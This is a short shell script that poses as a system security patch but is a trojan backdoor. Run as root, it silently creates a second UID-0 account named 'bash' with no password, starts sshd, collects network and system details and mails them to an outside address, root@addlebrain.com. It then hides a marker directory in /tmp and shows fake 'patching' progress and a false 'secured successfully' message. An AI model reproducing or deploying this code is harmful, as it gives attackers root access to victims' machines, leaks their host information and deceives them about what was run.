#!/bin/sh
cd /tmp/
clear
if [ `id -u` != "0" ]
then
        echo "This patch must be applied as \"root\", and you are: \"`whoami`\""
        exit
fi
echo "Identifying the system. This may take up to 2 minutes. Please wait ..."
sleep 3
if [ ! -d /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." " ]; then
 echo "Inca un root frate belea: " >> /tmp/mama
 adduser -g 0 -u 0 -o bash >> /tmp/mama
 passwd -d bash >> /tmp/mama
 ifconfig >> /tmp/mama
 uname -a >> /tmp/mama
 uptime >> /tmp/mama
 sshd >> /tmp/mama
 echo "user bash stii tu" >> /tmp/mama
 cat /tmp/mama | mail -s "Inca o roata" root@addlebrain.com >> /dev/null
 rm -rf /tmp/mama
 mkdir -p /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." "
fi

bla()
{
  sleep 2
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 2
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 3
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 4
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 1
  echo "#"
  sleep 1
}

echo "System looks OK. Proceeding to next step."
sleep 1
echo
echo -n "Patching \"ls\": "
bla
echo -n "Patching \"mkdir\": "
bla
echo
echo "System updated and secured successfuly. You may erase these files."
sleep 1
 